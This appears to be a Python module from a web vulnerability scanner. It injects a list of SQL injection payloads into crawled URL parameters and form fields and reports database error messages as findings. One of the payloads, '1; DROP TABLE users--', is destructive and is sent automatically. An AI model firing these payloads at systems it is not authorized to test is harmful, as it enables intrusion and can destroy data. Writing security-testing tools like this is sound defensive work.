from .base_scanner import BaseScanner
from urllib.parse import parse_qs,urlparse
from typing import Dict , List


class SQLInjection(BaseScanner):
    SQL_PAYLOADS=[
        "' OR '1'='1",           # Classic SQLi
        "' OR '1'='1' --",       # With comment
        "' OR '1'='1' /*",       # With block comment
        "admin'--",              # Admin bypass
        "' UNION SELECT NULL--", # Union-based SQLi
        "' AND 1=1--",           # Boolean-based blind SQLi
        "' AND 1=2--",           # False condition test
        "1' ORDER BY 1--",       # Column enumeration
        "' WAITFOR DELAY '0:0:5'--",  # Time-based blind SQLi
        "1; DROP TABLE users--", # Destructive payload (dangerous!)
    ]
    SQL_ERRORS = [
        'sql syntax',
        'mysql_fetch',
        'warning: mysql',
        'unclosed quotation',
        'postgresql error',
        'pg_query',
        'ora-01756',
        'sqlite3',
        'syntax error',
        'database error',
    ]
    def scan(self)->List[Dict]:
        print("\n[*] Starting SQL Injection Scan...")
        results=[]

        print("[*] Testing URL parameters...")
        for url in self.visited_urls:
            parsed=urlparse(url)
            params=parse_qs(parsed.query)

            if params:
                results.extend(self._test_url_params(url,params))
        print(f"[*] Testing {len(self.forms)} forms...")

        for form in self.forms:
            results.extend(self._test_form(form))
        print(f"[+] SQL Injection scan complete. Found {len(results)} vulnerabilities.")
        return results
    

    def _test_form(self,form:Dict)->List[Dict]:

        results=[]
        for payload in self.SQL_PAYLOADS:
            data={}
            for input_field in form['inputs'] :
                data[input_field['name']]=payload
            try:
                if form['method']=='post':
                    response=self.session.post(
                        form['action'],
                        data=data,
                        timeout=10,
                        verify=False
                    )
                else:
                    response=self.session.get(
                        form['action'],
                        data=data,
                        timeout=10,
                        verify= False
                    )
                for error in self.SQL_ERRORS:
                    if error in response.text.lower():
                        results.append({
                            'type': 'SQL Injection',
                            'severity': 'CRITICAL',
                            'url': form['action'],
                            'description': f'SQL injection vulnerability detected in form',
                            'payload': payload,
                            'evidence': f'SQL error detected: {error}',
                            'recommendation': 'Use parameterized queries or prepared statements.'
                        })
                        return results
            except Exception as e:
                continue
        return results
    def _test_url_params(self, url: str, params: Dict) -> List[Dict]:
            results = []
            
            for param_name in params:
                for payload in self.SQL_PAYLOADS:
                    
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    try:
                    
                        response = self.session.get(
                            url.split('?')[0],
                            params=test_params,
                            timeout=10,
                            verify=False
                        )
                        
                    
                        for error in self.SQL_ERRORS:
                            if error in response.text.lower():
                                results.append({
                                    'type': 'SQL Injection',
                                    'severity': 'CRITICAL',
                                    'url': url,
                                    'description': f'SQL injection vulnerability detected in parameter: {param_name}',
                                    'payload': payload,
                                    'evidence': f'SQL error detected: {error}',
                                    'recommendation': 'Use parameterized queries or prepared statements. Implement input validation and sanitization.'
                                })
                                
                                break
                                
                    except Exception as e:
                    
                        continue
                        
            return results
        